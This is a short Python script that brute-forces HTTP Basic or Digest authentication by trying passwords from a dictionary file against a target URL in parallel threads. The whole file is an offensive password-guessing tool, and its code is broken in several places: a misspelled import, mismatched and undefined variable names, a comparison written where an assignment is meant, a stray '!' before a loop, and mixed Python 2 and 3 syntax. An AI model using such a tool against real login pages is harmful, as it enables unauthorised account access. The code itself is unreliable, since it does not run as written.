#!/usr/bin/python

import requests
from threading import Thread
import sys
import time
import getopt
from request.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print("""
            *********************************
            * BASE or DIGEST bruteforce AUTh *
            **********************************
    """)

class request_performer(Thread):
    def __init__(self, passwd, user, url, method):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method
        print("-" + self.passwd + "-")

    def run(self):
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.username, self.passwd))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.passwd))
                if r.status_code == 200:
                    hit == "0"
                    print("[+] Password found "+ self.passwd)
                    sys.exit()
                else:
                    print("[!!] No valid password "+ self.passwd)
                    i[0] = i[0]-1

            except Exception, e:
                print(e)


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t")
    except getopt.GetoptError:
        print("[!!] Error on arguments!")
        sys.exit()
    !for opt, arg in opts:
        if opt == "-u":
            user = arg
        elif opt == "-w":
            url =arg
        elif opt == "-f":
            dictionary = arg
        elif opt == "-m":
            method = arg
        elif opt == "-t":
            threads = arg
    try:
        f = open(dictionary, "r")
        passwords = f.readlines()
    except:
        print("[!!] File does not exist, please check the path")
        sys.exit()

    launcher_threads(passwords, threads, user, url, method)

def launcher_threads(passwords, threads, user, url, method):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < th:
                    passwd = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passwd, username, url, method)
                    thread.start()
            except keyboardInterrupt:
                print("[!!] Interrupted!!")
                sys.exit()
            thread.join()

